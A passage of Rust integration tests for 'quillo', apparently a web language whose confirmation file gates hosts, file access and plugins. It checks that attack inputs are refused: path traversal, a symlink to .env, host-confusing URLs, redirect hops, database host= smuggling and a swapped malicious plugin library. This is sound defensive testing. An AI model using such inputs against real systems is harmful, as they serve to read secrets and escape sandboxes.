    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi()\n");
    let index = |h: &str| format!("{{\"format\":1,\"plugins\":[{{\"name\":\"hi\",\"sha256\":\"{}\"}},{{\"name\":\"other\",\"sha256\":\"{}\"}}]}}", h, "0".repeat(64));
    write(&d, "host/catalog.json", &index(&sha256_hex(hi.as_bytes())));
    write(&d, "host/p.toml", "[plugins]\ncatalog = true\n");
    assert_eq!(quillo(&d, &["check", "main.qwe", "--policy", "host/p.toml"]).0, Some(0));
    // Changed by a byte: not the catalog's.
    write(&d, "host/catalog.json", &index(&"1".repeat(64)));
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "host/p.toml"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("the plugin `hi` 1.0.0 is not in the plugins host/p.toml allows: hi@sha256:"), "{}", out);
    // By its path; one that is not there, or not a catalog, stops the program.
    write(&d, "host/p.toml", "[plugins]\ncatalog = \"nowhere.json\"\n");
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "host/p.toml"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("nowhere.json"), "{}", out);
    write(&d, "host/c2.json", "{\"format\":2,\"plugins\":[]}");
    write(&d, "host/p.toml", "[plugins]\ncatalog = \"c2.json\"\n");
    assert_eq!(quillo(&d, &["check", "main.qwe", "--policy", "host/p.toml"]).0, Some(2));
    // false: no catalog asked for.
    write(&d, "host/p.toml", "[plugins]\ncatalog = false\n");
    assert_eq!(quillo(&d, &["check", "main.qwe", "--policy", "host/p.toml"]).0, Some(0));
}

// ---- questions 5 and 6: a provider's policy asks for a complete quillo.confirmed ---------------

#[test]
fn a_providers_policy_warns_of_an_incomplete_file_this_release() {
    let d = temp_dir("c-provider");
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\n");
    write(&d, "p.toml", "[http]\nhosts = [\"*\"]\n");
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "p.toml"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("warning: the policy p.toml asks for a complete quillo.confirmed, and ./quillo.confirmed has none: from Quillo 0.8.12 it will not start so"), "{}", out);
    let (g, port, log) = serve(&d, &["--policy", "p.toml"]);
    assert_eq!(send(port, "GET", "/", &[], "").status, 200);
    drop(g);
    assert!(read(&log).contains("from Quillo 0.8.12 it will not start so"), "{}", read(&log));
    // The program's own quillo.policy is no provider's.
    std::fs::rename(d.join("p.toml"), d.join("quillo.policy")).unwrap();
    let (_, out) = quillo(&d, &["check", "main.qwe"]);
    assert!(!out.contains("asks for a complete"), "{}", out);
    std::fs::rename(d.join("quillo.policy"), d.join("p.toml")).unwrap();
    // Complete: nothing said.
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "p.toml"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(!out.contains("asks for a complete"), "{}", out);
    // One thing left out: said, by its number.
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\nroute GET /b = http.get(\"https://b.example/\").status ?? 0\n");
    let (code, out) = quillo(&d, &["check", "main.qwe", "--policy", "p.toml"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("quillo.confirmed leaves 1 thing out"), "{}", out);
}

// ---- review 1 of slice C ---------------------------------------------------------------------

/// A server that answers every request with a redirect to `to`.
fn redirect_server(to: String) -> u16 {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for c in l.incoming().flatten() {
            let mut c = c;
            c.set_read_timeout(Some(Duration::from_secs(2))).ok();
            let mut buf = [0u8; 4096];
            let _ = c.read(&mut buf);
            let _ = c.write_all(format!("HTTP/1.1 302 Found\r\nlocation: {}\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", to).as_bytes());
        }
    });
    port
}

fn multipart(name: &str, content: &str) -> (String, String) {
    let b = "XQBOUNDARY";
    (format!("--{b}\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"{name}\"\r\nContent-Type: application/octet-stream\r\n\r\n{content}\r\n--{b}--\r\n"), format!("multipart/form-data; boundary={}", b))
}

// Fix 1: the host as the HTTP client reads it (the reviewer's p1), and each redirect held.
#[test]
fn a_host_is_read_as_the_client_reads_it_and_a_redirect_is_held() {
    let d = temp_dir("c-r1-host");
    write(&d, "main.qwe", "route GET /e = str(http.get(\"http://127.0.0.1:47999\\\\@good.example/x\").error ?? \"none\")\n");
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("reaches       127.0.0.1") && !out.contains("good.example"), "{}", out);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"good.example\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert!(send(port, "GET", "/e", &[], "").body.contains("127.0.0.1 is not confirmed for main.qwe"));
    drop(g);
    // A confirmed host that sends the call on to one that is not: refused at the hop.
    let (other, seen) = other_server();
    let hop = redirect_server(format!("http://localhost:{}/", other));
    write(&d, "main.qwe", &format!("route GET /r = str(http.get(\"http://127.0.0.1:{}/\").error ?? \"followed\")\n", hop));
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"127.0.0.1\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert!(send(port, "GET", "/r", &[], "").body.contains("localhost is not confirmed"));
    drop(g);
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
}

// Fix 2: file(), files(), save_upload, image.info, check_program and db.open are held.
#[test]
fn every_file_builtin_is_held() {
    let d = temp_dir("c-r1-files");
    write(
        &d,
        "main.qwe",
        "route GET /f = file(\".env\")\nroute GET /p/*rest = files(\"public\", rest)\nroute GET /i = image.info(\"pic.png\").error ?? \"read\"\nroute GET /c = check_program(\"main.qwe\").error ?? \"checked\"\nroute GET /d = db.open(\"data/app.db\").error ?? \"opened\"\nroute POST /up = save_upload(request.files.doc, \"up/x.txt\") ?? \"refused\"\n",
    );
    write(&d, ".env", "K=1\n");
    write(&d, "public/a.txt", "a");
    write(&d, "private/b.txt", "b");
    std::fs::create_dir_all(d.join("data")).unwrap();
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nfiles = [\"public/\"]\n");
    let (g, port, log) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/f", &[], "").status, 404);
    assert_eq!(send(port, "GET", "/p/a.txt", &[], "").body, "a");
    assert_eq!(send(port, "GET", "/p/../private/b.txt", &[], "").status, 404);
    assert!(send(port, "GET", "/i", &[], "").body.contains("pic.png is not confirmed"));
    assert!(send(port, "GET", "/c", &[], "").body.contains("main.qwe is not confirmed"));
    assert!(send(port, "GET", "/d", &[], "").body.contains("data/app.db is not confirmed"));
    let (body, ctype) = multipart("x.txt", "hello");
    assert_eq!(send(port, "POST", "/up", &[("Content-Type", &ctype)], &body).body, "refused");
    assert!(!d.join("up/x.txt").exists() && !d.join("data/app.db").exists());
    drop(g);
    assert!(read(&log).contains("the path pic.png was refused"), "{}", read(&log));
    // Confirmed: each does what it did.
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nfiles = [\"public/\", \".env\", \"main.qwe\"]\nwrites = [\"data/\", \"up/\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/f", &[], "").body, "K=1\n");
    assert_eq!(send(port, "GET", "/d", &[], "").body, "opened");
    let (body, ctype) = multipart("x.txt", "hello");
    assert_eq!(send(port, "POST", "/up", &[("Content-Type", &ctype)], &body).body, "up/x.txt");
    drop(g);
    // The scan: files("public", ...) is the folder; save_upload's and db.open's paths are writes.
    let (_, out) = quillo(&d, &["confirm", "--list"]);
    assert!(out.contains("reads         public/") && out.contains("writes        up/x.txt") && out.contains("writes        data/app.db"), "{}", out);
}

// Fix 3: a `site`'s host and udp.send's are listed and held (the reviewer's p6).
#[test]
fn a_site_and_a_udp_packet_are_held() {
    let (other, seen) = other_server();
    let d = temp_dir("c-r1-site");
    write(&d, "main.qwe", "import kit/b.qwe use go\nroute GET / = str(go())\nroute GET /u = udp.send(\"127.0.0.1\", 9, \"x\").error ?? \"sent\"\n");
    write(&d, "kit/b.qwe", &format!("site shop = \"http://127.0.0.1:{}\"\nfn go() = shop.items(\"exfil\").error ?? \"called\"\n", other));
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"kit/b.qwe\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert!(send(port, "GET", "/", &[], "").body.contains("not called: 127.0.0.1 is not confirmed for kit/b.qwe"));
    assert!(send(port, "GET", "/u", &[], "").body.contains("udp.send: 127.0.0.1 is not confirmed for main.qwe"));
    drop(g);
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains("[\"kit/b.qwe\"]\nhttp = [\"127.0.0.1\"]") && text.contains("[\"main.qwe\"]\nhttp = [\"127.0.0.1\"]"), "{}", text);
    let (g, port, _) = serve(&d, &[]);
    send(port, "GET", "/", &[], "");
    assert_eq!(send(port, "GET", "/u", &[], "").body, "sent");
    drop(g);
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 1);
}

// Fix 4: a service started apart is held by its app's quillo.confirmed (the reviewer's p4), and
// `quillo build` builds nothing that is not confirmed.
#[test]
fn a_split_service_and_quillo_build_are_held() {
    let (other, seen) = other_server();
    let d = temp_dir("c-r1-split");
    write(&d, "main.qwe", "service billing = \"svc/billing.qwe\"\nroute GET / = billing.ping()\n");
    write(&d, "svc/billing.qwe", &format!("server fn ping() = str(http.get(\"http://127.0.0.1:{}/svc\").status ?? \"refused\")\n", other));
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"svc/billing.qwe\"]\n");
    // One beside the service's own file would let it through, were it read.
    write(&d, "svc/quillo.confirmed", "[\"billing.qwe\"]\nhttp = [\"127.0.0.1\"]\n");
    let (g, port, _) = serve(&d, &["--split"]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "refused");
    drop(g);
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
    // quillo build: refused before cargo, for a Rust file not confirmed.
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi() -> String { \"hi\".into() }\n");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi()\n");
    let (code, out) = quillo(&d, &["build", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("hi.qwer is not confirmed") && out.contains("nothing built"), "{}", out);
    assert!(!d.join(".quillo/native").exists());
}

// Fix 5: a file a taken file uses whole is taken too (the reviewer's p2), and a taken file's
// server fn is a way in (p7).
#[test]
fn what_a_taken_file_takes_is_held_and_its_server_fns_too() {
    let d = temp_dir("c-r1-taken");
    write(&d, "main.qwe", "import kit/badge.qwe use Badge\nroute GET / = <html><body><Badge/></body></html>\n");
    write(&d, "kit/badge.qwe", "use kit/inner.qwe\ncomponent Badge() { <b>b</b> }\nserver fn leak() = env(\"K\") ?? \"none\"\n");
    write(&d, "kit/inner.qwe", "route GET /leak = \"inner\"\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"kit/badge.qwe\"]\n[\"kit/inner.qwe\"]\n");
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0));
    assert!(out.contains("adds a route  GET /leak") && out.contains("adds a route  server fn leak"), "{}", out);
    let (g, port, log) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/leak", &[], "").status, 404);
    let rpc = send(port, "POST", "/_quillo/rpc/leak", &[("x-quillo-rpc", "1"), ("Sec-Fetch-Site", "same-origin")], "[]");
    assert!(rpc.status >= 400 && !rpc.body.contains("none"), "{} {}", rpc.status, rpc.body);
    drop(g);
    assert!(read(&log).contains("server fn leak is not offered"), "{}", read(&log));
}

// A `server fn` the program takes by name is its own way in: not noted, not held; the same file's
// other server fn still is (found writing the guide: llms.py's note_list example).
#[test]
fn a_server_fn_taken_by_name_is_the_programs_own() {
    let d = temp_dir("c-d-named");
    write(&d, "main.qwe", "import lib/notes.qwe use load_notes\nroute GET / = \"main\"\n");
    write(&d, "lib/notes.qwe", "server fn load_notes() = \"notes\"\nserver fn other() = \"other\"\n");
    let (_, out) = quillo(&d, &["check", "main.qwe"]);
    assert!(!out.contains("server fn load_notes"), "{}", out);
    assert!(out.contains("server fn other"), "{}", out);
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0));
    assert!(!out.contains("server fn load_notes") && out.contains("server fn other"), "{}", out);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"lib/notes.qwe\"]\n");
    let (g, port, _) = serve(&d, &[]);
    let call = |name: &str| send(port, "POST", &format!("/_quillo/rpc/{}", name), &[("x-quillo-rpc", "1"), ("Sec-Fetch-Site", "same-origin")], "[]");
    let named = call("load_notes");
    assert!(named.status == 200 && named.body.contains("notes"), "{} {}", named.status, named.body);
    let other = call("other");
    assert!(other.status >= 400 && !other.body.contains("\"other\""), "{} {}", other.status, other.body);
    drop(g);
}

// Fix 6: a mounted program's `use` is its own folder's, and its Rust file is held (the
// reviewer's p5).
#[test]
fn a_mounted_programs_rust_file_is_found_in_its_folder() {
    let d = temp_dir("c-r1-mount");
    write(&d, "main.qwe", "mount /s = \"sub/app.qwe\"\nroute GET / = \"main\"\n");
    write(&d, "sub/app.qwe", "import hi.qwer use hi\nimport ho.qwer use ho\nroute GET / = hi(\"x\") + ho()\n");
    write(&d, "sub/hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { n.to_string() }\n");
    write(&d, "sub/ho.qwer", "//! version: 1.0.0\n//! effects: none\npub fn ho() -> String { \"o\".into() }\n");
    let (_, out) = quillo(&d, &["confirm", "--list"]);
    assert!(out.contains("sub/hi.qwer\n  sha256") && out.contains("sub/ho.qwer\n  sha256"), "{}", out);
    write(&d, "quillo.confirmed", "# nothing\n");
    let (code, out) = quillo(&d, &["run", "main.qwe", "--port", "0"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("sub/hi.qwer is not confirmed"), "{}", out);
    assert!(!d.join(".quillo/native").exists() && !d.join("sub/.quillo/native").exists());
}

// Fix 7: behind a confirmed Rust file, a library a clone brought in `.quillo/native` is not loaded.
#[test]
fn a_library_brought_along_does_not_load_behind_a_confirmed_file() {
    let d = temp_dir("c-r1-lib");
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"hi {}\", n) }\n");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    // Built once, then its library replaced, its lock gone: what a cloned repository can hold.
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "hi Ana");
    drop(g);
    let native = d.join(".quillo/native");
    for e in std::fs::read_dir(&native).unwrap().flatten() {
        if e.file_name().to_string_lossy().contains("hi") {
            std::fs::write(e.path(), b"not a library").unwrap();
        }
    }
    let _ = std::fs::remove_file(d.join(".quillo/plugins.lock"));
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "hi Ana");
    drop(g);
}

// Fix 8: a comment after a list's `]` ends the line (the reviewer's p3).
#[test]
fn a_comment_after_a_list_does_not_take_the_next_block() {
    let d = temp_dir("c-r1-comment");
    write(&d, "main.qwe", "use lib/a.qwe\nroute GET / = a()\nroute GET /m = read_file(\".env\") ?? \"refused\"\n");
    write(&d, "lib/a.qwe", "fn a() = read_file(\".env\") ?? \"refused\"\n");
    write(&d, ".env", "K=2\n");
    write(&d, "quillo.confirmed", "[\"lib/a.qwe\"]\nhttp = [\"x.example\"] # the map host\n[\"main.qwe\"]\nfiles = [\".env\"] # its settings\n");
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "refused");
    assert_eq!(send(port, "GET", "/m", &[], "").body, "K=2\n");
    drop(g);
    write(&d, "quillo.confirmed", "[\"main.qwe\"] # a comment\nfiles = [\"# not one\"]\n");
    let (_, out) = quillo(&d, &["check", "main.qwe"]);
    assert!(out.contains("reads .env: not confirmed") && !out.contains("line"), "{}", out);
}

// Fix 9: room for more effects than eight; `run` is one of them.
#[test]
fn effects_are_sixteen_bits() {
    assert_eq!(std::mem::size_of::<quillo::ast::Effects>(), 2);
    assert_eq!(quillo::ast::ALL_EFFECTS, (1 << quillo::ast::EFFECTS.len()) - 1);
    assert_eq!(quillo::ast::effect_names(quillo::ast::effect_bit("run")), vec!["run"]);
}

// Fix 10: a pattern written by hand stays at the next confirm (the reviewer's p8).
#[test]
fn a_hand_written_pattern_stays() {
    let d = temp_dir("c-r1-pattern");
    write(&d, "main.qwe", "route GET / = http.get(\"https://a.example/\").status ?? 0\nroute GET /c = http.get(\"https://api.stripe.com/v1\").status ?? 0\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"a.example\", \"*.stripe.com\", \"gone.example\"]\n");
    // A new host: the file is written again, the pattern kept, what it covers not added, the
    // written host no longer there taken out.
    write(&d, "main.qwe", &format!("{}route GET /n = http.get(\"https://new.example/\").status ?? 0\n", read(&d.join("main.qwe"))));
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let text = read(&d.join("quillo.confirmed"));
    assert!(text.contains("http = [\"*.stripe.com\", \"a.example\", \"new.example\"]"), "{}", text);
}

// Fix 11: a path confirmed to be read is not written.
#[test]
fn a_path_confirmed_to_be_read_is_not_written() {
    let d = temp_dir("c-r1-write");
    write(&d, "main.qwe", "route GET /r = read_file(\"notes.txt\") ?? \"refused\"\nroute GET /w = is_err(write_file(request.query.p, \"x\")) ? \"refused\" : \"written\"\nroute GET /x = is_err(delete_file(\"notes.txt\")) ? \"refused\" : \"deleted\"\n");
    write(&d, "notes.txt", "n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nfiles = [\"notes.txt\"]\nwrites = [\"out/\"]\n");
    let (g, port, log) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/r", &[], "").body, "n");
    assert_eq!(send(port, "GET", "/w?p=notes.txt", &[], "").body, "refused");
    assert_eq!(send(port, "GET", "/x", &[], "").body, "refused");
    assert_eq!(send(port, "GET", "/w?p=out/a.txt", &[], "").body, "written");
    drop(g);
    assert_eq!(read(&d.join("notes.txt")), "n");
    assert!(read(&log).contains("confirmed to be read, not written"), "{}", read(&log));
}

// Fix 12: a confirmed folder is judged where its paths really lead.
#[cfg(unix)]
#[test]
fn a_link_out_of_a_confirmed_folder_is_refused() {
    let d = temp_dir("c-r1-link");
    write(&d, "main.qwe", "route GET /r = read_file(request.query.p) ?? \"refused\"\n");
    write(&d, ".env", "K=3\n");
    write(&d, "uploads/a.txt", "a");
    std::os::unix::fs::symlink("../.env", d.join("uploads/x")).unwrap();
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nfiles = [\"uploads/\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/r?p=uploads/a.txt", &[], "").body, "a");
    assert_eq!(send(port, "GET", "/r?p=uploads/x", &[], "").body, "refused");
    drop(g);
}

// The lows: quillo.confirmed is the program's own; the page's policy keeps a port; one file's
// integrity hash is not another's; install names the plugin from the folder of the file; the help
// says to use `quillo check` in CI.
#[test]
fn the_lows_of_review_1() {
    let d = temp_dir("c-r1-lows");
    write(&d, "main.qwe", "route GET /w = is_err(write_file(\"quillo.confirmed\", \"\")) ? \"refused\" : \"written\"\nroute GET / = <html><body><img src=\"http://127.0.0.1:5173/p.png\"/></body></html>\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nwrites = [\"./\", \"quillo.confirmed\"]\nloads = [\"127.0.0.1:5173\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/w", &[], "").body, "refused");
    let page = send(port, "GET", "/", &[], "");
    assert!(page.header("content-security-policy-report-only").is_some_and(|c| c.contains("img-src 'self' data: blob: 127.0.0.1:5173")), "{:?}", page.headers);
    drop(g);
    let (_, out) = quillo(&d, &["confirm", "--list"]);
    assert!(out.contains("page loads    127.0.0.1:5173"), "{}", out);
    // Nor written where there is none yet: the next start would be held to what the program wrote.
    let n = temp_dir("c-r1-own");
    write(&n, "main.qwe", "route GET /w = is_err(write_file(\"quillo.confirmed\", \"\")) ? \"refused\" : \"written\"\n");
    let (g, port, _) = serve(&n, &[]);
    assert_eq!(send(port, "GET", "/w", &[], "").body, "refused");
    drop(g);
    assert!(!n.join("quillo.confirmed").exists());
    // An integrity hash confirmed for lib.qwe's script is not main.qwe's, which has none.
    let e = temp_dir("c-r1-sri");
    write(&e, "main.qwe", "use lib.qwe\nclient \"https://cdn.example/l.js\" use L\ncomponent C() { <b onclick={() => L.x()}>c</b> }\nroute GET / = <html><body><C/></body></html>\n");
    write(&e, "lib.qwe", "fn nothing() = 1\n");
    write(&e, "quillo.confirmed", "[\"main.qwe\"]\nscripts = [\"https://cdn.example/l.js\"]\n[\"lib.qwe\"]\nscripts = [\"https://cdn.example/l.js sha384-AAAA\"]\n");
    let (g, port, _) = serve(&e, &[]);
    let page = send(port, "GET", "/", &[], "").body;
    assert!(page.contains("\"https://cdn.example/l.js\"") && !page.contains("sha384-AAAA"), "{}", page);
    drop(g);
    // install --dir, absolute: the plugin named from the folder quillo.confirmed is in.
    let v1 = "//! version: 1.0.0\n//! effects: none\npub fn hi() -> String { \"hi\".into() }\n";
    let reg = format!("http://127.0.0.1:{}", catalog(v1));
    let p = temp_dir("c-r1-install");
    write(&p, "app/quillo.confirmed", "[\"main.qwe\"]\n");
    let app = p.join("app").display().to_string();
    let (code, out) = quillo(&p, &["install", "hi", "--registry", &reg, "--dir", &app]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(read(&p.join("app/quillo.confirmed")).contains("[\"hi.qwer\"]\nsha256 = "), "{}", read(&p.join("app/quillo.confirmed")));
    let (_, out) = quillo(&p, &["confirm", "--help"]);
    assert!(out.contains("in\n                    CI run `quillo check` instead"), "{}", out);
}

// Fix 7, kept fast: the library this machine built for a confirmed file is recorded outside the
// project, and loaded again at the next start without a build (b); one swapped after it was
// recorded is built again (c); a record anyone may write is not believed (d); with building off
// and no record, the file is refused rather than its brought-along library loaded.
#[test]
fn what_this_machine_built_is_recorded_and_loaded_again() {
    let d = temp_dir("c-r2-record");
    let _ = std::fs::remove_dir_all(record_dir(&d));
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"hi {}\", n) }\n");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let start = |d: &Path| {
        let t = Instant::now();
        let (g, port, log) = serve(d, &[]);
        let elapsed = t.elapsed();
        assert_eq!(send(port, "GET", "/", &[], "").body, "hi Ana");
        drop(g);
        (read(&log), elapsed)
    };
    let (first, took) = start(&d);
    assert!(first.contains("building") && first.contains("apart"), "{}", first);
    let record = record_dir(&d).join("built.txt");
    assert!(read(&record).lines().count() == 1, "{}", read(&record));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(&record).unwrap().permissions().mode() & 0o777, 0o600);
        assert_eq!(std::fs::metadata(record_dir(&d)).unwrap().permissions().mode() & 0o077, 0);
    }
    // (b) The next start loads what was built: no build, and quicker than the one that built.
    let (second, fast) = start(&d);
    assert!(!second.contains("building"), "{}", second);
    assert!(fast < took, "{:?} then {:?}", took, fast);
    // (c) Swapped after it was recorded: built again, and works.
    for e in std::fs::read_dir(d.join(".quillo/native")).unwrap().flatten() {
        if e.file_name().to_string_lossy().contains("hi") {
            std::fs::write(e.path(), b"not the library recorded").unwrap();
        }
    }
    let (third, _) = start(&d);
    assert!(third.contains("building"), "{}", third);
    // (d) A record others may write is not believed: built apart again.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&record, std::fs::Permissions::from_mode(0o666)).unwrap();
        let (fourth, _) = start(&d);
        assert!(fourth.contains("building"), "{}", fourth);
        std::fs::set_permissions(&record, std::fs::Permissions::from_mode(0o600)).unwrap();
    }
    // Building off, no record for what is there: refused, not loaded.
    let _ = std::fs::remove_dir_all(record_dir(&d));
    let (code, out) = quillo(&d, &["run", "main.qwe", "--port", "0", "--no-build"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("only a library this machine built from it loads, and building is off") && out.contains("was not built here"), "{}", out);
}

// ---- review 2 of slice C ---------------------------------------------------------------------

/// `quillo` with `args`, run from `cwd`, its record of builds in `record`.
fn quillo_in(cwd: &Path, record: &Path, args: &[&str], secs: u64) -> (Option<i32>, String) {
    let out = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(args)
        .current_dir(cwd)
        .env_remove("QUILLO_POLICY_PATH")
        .env_remove("CARGO_TARGET_DIR")
        .env("QUILLO_BUILT_RECORD_DIR", record)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let deadline = Instant::now() + Duration::from_secs(secs);
    let mut out = out;
    loop {
        if let Some(s) = out.try_wait().unwrap() {
            let o = out.wait_with_output().unwrap();
            return (s.code(), format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)));
        }
        if Instant::now() > deadline {
            let _ = out.kill();
            let _ = out.wait();
            return (None, String::new());
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

// R2-1, R2-2: db.connect, a `host=` parameter, a replica and a tenant's worked-out target are each
// held where the connection is made (the reviewer's p1, p2).
#[test]
fn every_database_connection_is_held() {
    let (other, seen) = other_server();
    let d = temp_dir("c-r2-db");
    write(
        &d,
        "main.qwe",
        &format!(
            "let c = db.connect(\"postgres://u@127.0.0.1:{p}/db?sslmode=disable\") ?? null\nlet d1 = db.open(\"postgres://u@db.example.invalid:{p}/db?host=127.0.0.1&sslmode=disable\") ?? null\nlet d2 = db.connect(\"postgres://u@db.example.invalid:{p}/db?sslmode=disable\", {{ replicas: [\"postgres://u@127.0.0.1:{p}/r?sslmode=disable\"] }}) ?? null\nlet d3 = db.open((t) => \"postgres://u@127.0.0.1:{p}/\" + t + \"?sslmode=disable\") ?? null\nroute GET /t = with_tenant(\"acme\", () => db.query(\"select 1\")).error ?? \"queried\"\n",
            p = other
        ),
    );
    let (_, out) = quillo(&d, &["confirm", "--list"]);
    assert!(out.contains("reaches       127.0.0.1") && out.contains("reaches       db.example.invalid"), "{}", out);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"db.example.invalid\"]\n");
    let (g, port, log) = serve(&d, &[]);
    assert!(send(port, "GET", "/t", &[], "").body.contains("127.0.0.1 is not confirmed for main.qwe"));
    drop(g);
    std::thread::sleep(Duration::from_millis(200));
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0, "{}", read(&log));
    // A socket is no host: refused where held.
    assert!(quillo::confirm::db_hosts("postgres:///db?host=/var/run/postgresql").is_err());
    assert!(quillo::confirm::db_hosts("mysql://u@h/db?socket=/tmp/m.sock").is_err());
    assert_eq!(quillo::confirm::db_hosts("postgres://u@a,b:5433/db?hostaddr=10.0.0.1").unwrap(), vec!["a", "b", "10.0.0.1"]);
}

// R2-3: a pin of another plugin's library is not this one's: a library brought along does not load
// behind a confirmed file (the reviewer's pc).
#[test]
fn a_pin_of_another_plugin_does_not_let_a_library_brought_along_load() {
    let evil = temp_dir("c-r2-evil");
    write(&evil, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"EVIL {}\", n) }\n");
    write(&evil, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    assert_eq!(quillo_for(&evil, &["build", "main.qwe"], 300).0, Some(0));
    let d = temp_dir("c-r2-pin");
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"hi {}\", n) }\n");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    assert_eq!(quillo_for(&d, &["build", "main.qwe"], 300).0, Some(0));
    // Its library replaced by the other one, under its own name, and the lock to match.
    let lib = |dir: &Path| std::fs::read_dir(dir.join(".quillo/native")).unwrap().flatten().map(|e| e.path()).find(|p| p.file_name().unwrap().to_string_lossy().starts_with("libhi") || p.file_name().unwrap().to_string_lossy().starts_with("hi")).unwrap();
    let (good, bad) = (lib(&d), lib(&evil));
    std::fs::copy(&bad, &good).unwrap();
    write(&d, ".quillo/plugins.lock", &format!("{} {}\n", good.file_name().unwrap().to_string_lossy(), sha256_hex(&std::fs::read(&good).unwrap())));
    write(&d, "p.toml", &format!("[plugins]\nallow = [\"hi\", \"other@sha256:{}\"]\n", "0".repeat(64)));
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let (g, port, _) = serve(&d, &["--policy", "p.toml"]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "hi Ana");
    drop(g);
}

// R2-4: a page state runs as the file it is written in (the reviewer's p1).
#[test]
fn a_page_state_runs_as_its_own_file() {
    let (other, seen) = other_server();
    let d = temp_dir("c-r2-state");
    write(&d, "main.qwe", "import kit/evil.qwe use Badge\nroute GET / = <html><body><Badge label=\"x\"/></body></html>\n");
